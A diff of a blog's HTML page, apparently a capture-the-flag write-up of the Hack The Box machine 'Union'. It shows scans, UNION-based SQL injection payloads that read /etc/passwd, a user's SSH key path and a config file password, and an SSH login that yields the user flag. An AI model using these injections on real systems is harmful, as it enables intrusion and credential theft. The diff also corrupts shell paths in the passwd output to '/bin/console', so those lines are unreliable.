@@ -59,6 +59,7 @@
       --code-background-color: #f2f2f2;
       --code-color: #222;
       --blockquote-color: #222;
+      --overflow-wrap: break-word;
   }
 
   @media (prefers-color-scheme: dark) {
@@ -148,7 +149,7 @@
       color: var(--code-color);
       white-space: pre-wrap;
       word-wrap: break-word;
-      overflow-wrap: break-word;
+      overflow-wrap: anywhere;
   }
 
   blockquote {
@@ -180,9 +181,10 @@
       background-color: var(--code-background-color);
       color: var(--code-color);
       padding: 5px 10px;
-      white-space: pre-wrap;
-      word-wrap: break-word; 
-      overflow-wrap: break-word;
+      word-break: normal;
+      white-space: pre-wrap; 
+      overflow-wrap: anywhere;
+      overflow-x: auto;
   }
 
    
@@ -201,38 +203,6 @@
 
   ul.blog-posts li a:visited {
       color: var(--visited-color);
-  }
-  .terminal-container {
-    background-color: #C0C0C0;  
-    border: 2px solid #808080;  
-    border-radius: 4px;  
-    padding: 10px;  
-    box-shadow: 3px 3px 8px rgba(0, 0, 0, 0.5);  
-    position: relative;  
-    margin: 20px auto;  
-    width: fit-content;  
-    max-width: 100%;  
-  }
-  .terminal-title-bar {
-    background-color: #000080;  
-    color: #FFFFFF;  
-    font-family: "Arial", sans-serif;  
-    font-size: 14px;  
-    padding: 5px 10px;  
-    border-bottom: 2px solid #808080;  
-    border-radius: 4px 4px 0 0;  
-    text-align: left;  
-  }
-  .terminal-codebox {
-    background-color: #000000;  
-    color: #00FF00;  
-    font-family: "Courier New", monospace;  
-    padding: 10px;  
-    overflow-x: auto;  
-    white-space: pre;  
-    border-radius: 3px;  
-    border: 1px solid #808080;  
-  }
 </style>
 
 </head>
@@ -263,41 +233,41 @@
   <p>Union is a box that is heavily focused on, you guessed in, UNION-based SQL injection. This box was a little difficult to find the initial injection because you almost have to know a valid player&rsquo;s name, or guess that the table is named &ldquo;players&rdquo;. Without those, you would get the same result each time essentially masking the SQL injection. Additionally, SQLMap is blocked.</p>
 <hr>
 <p>As always, starting off with our nmap scans, we do a quick and comprehensive scan.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$sudo nmap --open 10.10.11.128 -oA union_top1k                                │Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-01-25 10:40 EST
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> jsmooth:                                                       │
-</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-01-25 10:40 EST                 │
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.128                                                  │
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.026s latency<span style="color:#f92672">)</span>.                                                       │
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">999</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>                                    │
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap --open 10.10.11.128 -oA union_top1k                                │Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-01-25 10:40 EST
+</span></span><span style="display:flex;"><span>[sudo] password for jsmooth:                                                       │
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 10:40 EST                 │
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.128                                                  │
+</span></span><span style="display:flex;"><span>Host is up (0.026s latency).                                                       │
+</span></span><span style="display:flex;"><span>Not shown: 999 filtered tcp ports (no-response)                                    │
 </span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit        │
 </span></span><span style="display:flex;"><span>PORT   STATE SERVICE                                                               │
 </span></span><span style="display:flex;"><span>80/tcp open  http
 </span></span></code></pre></div><p>Comprehensive:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$cat tmux-screen-capture-Union-0-1-20250125T104406.log 
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.128
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.027s latency<span style="color:#f92672">)</span>.
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65534</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$cat tmux-screen-capture-Union-0-1-20250125T104406.log 
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.128
+</span></span><span style="display:flex;"><span>Host is up (0.027s latency).
+</span></span><span style="display:flex;"><span>Not shown: 65534 filtered tcp ports (no-response)
 </span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
-</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 (Ubuntu)
 </span></span><span style="display:flex;"><span>| http-cookie-flags: 
 </span></span><span style="display:flex;"><span>|   /: 
 </span></span><span style="display:flex;"><span>|     PHPSESSID: 
 </span></span><span style="display:flex;"><span>|_      httponly flag not set
-</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; charset<span style="color:#f92672">=</span>UTF-8<span style="color:#f92672">)</span>.
-</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 (Ubuntu)
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
 </span></span><span style="display:flex;"><span>Device type: general purpose
-</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Linux 5.X|4.X|2.6.X <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Running (JUST GUESSING): Linux 5.X|4.X|2.6.X (97%)
 </span></span><span style="display:flex;"><span>OS CPE: cpe:/o:linux:linux_kernel:5.0 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6.32
-</span></span><span style="display:flex;"><span>Aggressive OS guesses: Linux 5.0 <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>, Linux 4.15 - 5.8 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Linux 5.0 - 5.4 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Linux 5.3 - 5.4 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Linux 2.6.32 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Linux 5.0 - 5.5 <span style="color:#f92672">(</span>88%<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
-</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (90%), Linux 5.0 - 5.4 (90%), Linux 5.3 - 5.4 (89%), Linux 2.6.32 (89%), Linux 5.0 - 5.5 (88%)
+</span></span><span style="display:flex;"><span>No exact OS matches for host (test conditions non-ideal).
+</span></span><span style="display:flex;"><span>Network Distance: 2 hops
 </span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#f92672">(</span>using port 80/tcp<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>TRACEROUTE (using port 80/tcp)
 </span></span><span style="display:flex;"><span>HOP RTT      ADDRESS
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   28.84 ms 10.10.14.1
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>   29.04 ms 10.10.11.128
+</span></span><span style="display:flex;"><span>1   28.84 ms 10.10.14.1
+</span></span><span style="display:flex;"><span>2   29.04 ms 10.10.11.128
 </span></span></code></pre></div><p>This looks like a web app running on nginx on a Ubuntu box. In real life I&rsquo;d search for nginx 1.18.0 vulnerabilities, but since this is CTF, it&rsquo;s probably not the way to go. Let&rsquo;s take a look at the website.</p>
 <p><img src="/images/Union/website.png" alt="Union site"></p>
 <p>It looks like we can input a player&rsquo;s name. I&rsquo;m going to attempt to use the name &ldquo;test&rdquo;. Submitting a player name then takes us to this page:</p>
@@ -326,31 +296,31 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>player=*
 </span></span></code></pre></div><p>SQLMap tells us that the POST request isn&rsquo;t vulnerable. Let&rsquo;s look for other subdomains.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$gobuster dir -u http://10.10.11.128 -w /usr/share/wordlists/dirb/common.txt -x .php -t 300
-</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$gobuster dir -u http://10.10.11.128 -w /usr/share/wordlists/dirb/common.txt -x .php -t <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>===============================================================
 </span></span><span style="display:flex;"><span>Gobuster v3.6                         
-</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.11.128
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">300</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.6
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              php
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
-</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>[+] Url:                     http://10.10.11.128
+</span></span><span style="display:flex;"><span>[+] Method:                  GET
+</span></span><span style="display:flex;"><span>[+] Threads:                 300
+</span></span><span style="display:flex;"><span>[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+</span></span><span style="display:flex;"><span>[+] Negative Status codes:   404
+</span></span><span style="display:flex;"><span>[+] User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span>[+] Extensions:              php
+</span></span><span style="display:flex;"><span>[+] Timeout:                 10s
+</span></span><span style="display:flex;"><span>===============================================================
 </span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
-</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
-</span></span><span style="display:flex;"><span>/.htpasswd            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 162<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/.htaccess            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 162<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/.hta                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 162<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/config.php           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.11.128/css/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/firewall.php         <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 13<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1220<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1220<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">9228</span> / <span style="color:#ae81ff">9230</span> <span style="color:#f92672">(</span>99.98%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>/.htpasswd            (Status: 403) [Size: 162]
+</span></span><span style="display:flex;"><span>/.htaccess            (Status: 403) [Size: 162]
+</span></span><span style="display:flex;"><span>/.hta                 (Status: 403) [Size: 162]
+</span></span><span style="display:flex;"><span>/config.php           (Status: 200) [Size: 0]
+</span></span><span style="display:flex;"><span>/css                  (Status: 301) [Size: 178] [--&gt; http://10.10.11.128/css/]
+</span></span><span style="display:flex;"><span>/firewall.php         (Status: 200) [Size: 13]
+</span></span><span style="display:flex;"><span>/index.php            (Status: 200) [Size: 1220]
+</span></span><span style="display:flex;"><span>/index.php            (Status: 200) [Size: 1220]
+</span></span><span style="display:flex;"><span>Progress: 9228 / 9230 (99.98%)
 </span></span></code></pre></div><p>We find the subdomains:</p>
 <ul>
 <li>firewall.php</li>
@@ -486,31 +456,31 @@
 </span></span></code></pre></div><p>Let&rsquo;s go back to the page where we can enter the flag and enter this flag we&rsquo;ve found. After entering the flag, we get response telling us that our IP address has SSH access now.
 <img src="/images/Union/correct_flag.png" alt="Correct flag"></p>
 <p>We do an nmap scan to confirm this and see that port 22 is now open.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$sudo nmap -p <span style="color:#ae81ff">22</span> 10.10.11.128
-</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-01-27 20:01 EST
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.128
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.030s latency<span style="color:#f92672">)</span>.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap -p <span style="color:#ae81ff">22</span> 10.10.11.128
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-27 20:01 EST
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.128
+</span></span><span style="display:flex;"><span>Host is up (0.030s latency).
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>PORT   STATE SERVICE
 </span></span><span style="display:flex;"><span>22/tcp open  ssh
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.26 seconds
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
 </span></span></code></pre></div><p>Let&rsquo;s grab some more info about SSH with a more comprehensive scan.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$sudo nmap -sC -sV -p <span style="color:#ae81ff">22</span> 10.10.11.128
-</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-01-27 20:02 EST
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.128
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.025s latency<span style="color:#f92672">)</span>.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
-</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap -sC -sV -p <span style="color:#ae81ff">22</span> 10.10.11.128
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-27 20:02 EST
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.128
+</span></span><span style="display:flex;"><span>Host is up (0.025s latency).
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 </span></span><span style="display:flex;"><span>| ssh-hostkey: 
-</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
+</span></span><span style="display:flex;"><span>|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
+</span></span><span style="display:flex;"><span>|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
 </span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 2.01 seconds
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 2.01 seconds
 </span></span></code></pre></div><p>That&rsquo;s nice, but we haven&rsquo;t exactly found any SSH keys, passwords, or really users. You might try player names as usernames, but I&rsquo;m not sure why a player would be a user on the server. Unless one of the players is also the web admin.</p>
 <p>Fortunately for us, we still have our SQL injection vulnerability to work with. Most people stop at dumping information from databases, but that&rsquo;s just the start. We can also read and write files, if we have the right permissions. If we can read files, then we can check the /etc/passwd file and see what users are present on the system.</p>
 <p>First we need to check which user we are running commands as.</p>
@@ -521,7 +491,7 @@
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Sorry, Y you are not eligible due to already qualifying.
 </span></span></code></pre></div><p>We do! Now let&rsquo;s try reading /etc/passwd.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>player<span style="color:#e6db74">&#39; UNION SELECT LOAD_FILE(&#39;</span><span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>passwd<span style="color:#e6db74">&#39;)-- -
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Sorry, root:x:0:0:root:/root:/bin/bash
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Sorry, root:x:0:0:root:/root:/bin/console
 </span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 </span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
 </span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
@@ -552,10 +522,10 @@
 </span></span><span style="display:flex;"><span>usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
 </span></span><span style="display:flex;"><span>sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
 </span></span><span style="display:flex;"><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>htb:x:1000:1000:htb:/home/htb:/bin/bash
+</span></span><span style="display:flex;"><span>htb:x:1000:1000:htb:/home/htb:/bin/console
 </span></span><span style="display:flex;"><span>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
 </span></span><span style="display:flex;"><span>mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
-</span></span><span style="display:flex;"><span>uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
+</span></span><span style="display:flex;"><span>uhc:x:1001:1001:,,,:/home/uhc:/bin/console
 </span></span><span style="display:flex;"><span> you are not eligible due to already qualifying.
 </span></span></code></pre></div><p>Nice! We don&rsquo;t see any of the players as users on the server, so that&rsquo;s probably a dead-end. However, SSH is still open now and we should take advantage of that. Let&rsquo;s try to read our user&rsquo;s SSH private key.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>player<span style="color:#e6db74">&#39; UNION SELECT LOAD_FILE(&#39;</span><span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>uhc<span style="color:#f92672">/</span>.ssh<span style="color:#f92672">/</span>id_rsa<span style="color:#e6db74">&#39;)-- -
@@ -577,29 +547,29 @@
 </span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
 </span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> you are not eligible due to already qualifying.
 </span></span></span></code></pre></div><p>Let&rsquo;s try to use this password to SSH as the uhc user into the server.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ssh uhc@10.10.11.128
-</span></span><span style="display:flex;"><span>uhc@10.10.11.128<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
-</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.3 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.0-77-generic x86_64<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ssh uhc@10.10.11.128
+</span></span><span style="display:flex;"><span>uhc@10.10.11.128&#39;s password: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> * Documentation:  https://help.ubuntu.com
 </span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
 </span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> updates can be applied immediately.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>The list of available updates is more than a week old.
-</span></span><span style="display:flex;"><span>To check <span style="color:#66d9ef">for</span> new updates run: sudo apt update
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Last login: Mon Nov  <span style="color:#ae81ff">8</span> 21:19:42 <span style="color:#ae81ff">2021</span> from 10.10.14.8
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>0 updates can be applied immediately.
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>The list of available updates is more than a week old.
+</span></span><span style="display:flex;"><span>To check for new updates run: sudo apt update
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Last login: Mon Nov  8 21:19:42 2021 from 10.10.14.8
 </span></span><span style="display:flex;"><span>uhc@union:~$ 
 </span></span></code></pre></div><p>It works! We get the user flag in uhc&rsquo;s home directory.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>uhc@union:~$ cat user.txt 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>uhc@union:~$ cat user.txt 
 </span></span><span style="display:flex;"><span>26cd06f0a28c6d9f021642f07497bf1d
 </span></span></code></pre></div><h2 id="host-enumeration">Host Enumeration</h2>
 <p>After landing on the box, we start our basic Linux enumeration. Right off the bat, the kernel version seems like it may be vulnerable to one of the Netfilter exploits.</p>
